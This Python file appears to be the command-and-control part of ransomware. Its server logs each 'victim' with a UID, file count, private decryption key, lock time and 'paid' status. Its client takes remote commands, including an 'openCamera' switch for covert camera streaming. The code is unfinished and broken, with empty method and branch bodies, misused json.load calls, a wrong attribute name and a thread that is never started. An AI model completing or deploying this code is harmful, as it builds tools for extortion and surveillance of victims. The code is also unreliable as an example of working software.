import socket
import threading
import json
import os

class MySocket:
    class Server:
        def __init__(self,host="0.0.0.0",tcpPort = 8080,udpPort=8081):
            self.__host = host
            self.__tcpPort = tcpPort
            self.__udpPort = udpPort
            self.__client = {}

            self.testPath =  "./data/victimlist.json"
            self.__rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/victimlist.json"
            
            self.tcpServer = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.tcpServer.bind((self.__host,self.__tcpPort))
            self.tcpServer.listen(10)

            self.udpServer = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            self.udpServer.bind((self.__host,self.__udpPort))
        
        def handleTCPClient(self,clientSocket,address):
            try:
                data = clientSocket.recv(4096).decode()
                data = json.load(data)
                self.__client[address] = {  "UID":data["UID"],
                                            "client_socket":clientSocket
                                        }
                
                with open(self.testPath,"r+") as file:
                    victimListData = json.load(file)
                    victimListData.append({
                        "UID": data["UID"],
                        "fileNumber": data["fileNumber"],
                        "privateKey": data["privateKey"],
                        "date": data["lockTime"],
                        "paid": False
                    })
                    file.seek(0)
                    json.dump(victimListData,file,indent=4)
                    file.truncate()
            except json.JSONDecodeError:
                print(f"Failed to decode JSON from {address}")
            finally:
                clientSocket.close()
                if address in self.clients:
                    del self.clients[address]
                print(f"TCP connection closed: {address}")
        
        def handleUDPClient(self):
            while True:
                clientScocket,addr = self.udpServer.recvfrom(4096)
        
        def send(self,address,message):
            client = self.__client.get(address)
            if client:
                client["client_socket"].send(message.encode())

        def start(self):
            print("Starting server...")
            threading.Thread(target=self.handleUDPClient,daemon=True).start()
            while True:
                clientSocket,address = self.tcpServer.accept()
                print(f"New connection: {address}")
                threading.Thread(target=self.handleTCPClient,args=(clientSocket,address))
    class Client:
        def __init__(self):
            self.__serverIP = "localhost"
            self.__tcpPort = 8080
            self.__udpPort = 8081

            self.tcpClient = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.tcpClient.connect((self.__serverIP,self.__tcpPort))

            self.udpClient = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

        def start(self,message):
            self.tcpClient.send(message.encode())
            while True:
                command = self.tcpClient.recv(4096).decode()
                command = json.load(command)
                if(command["openCamera"] == True):
                    self.UDPsend()
                elif(command["openCamera"] == False):
                    


        def UDPsend(self):

if __name__ == "__main__":
    server = MySocket.Server()
    server.start()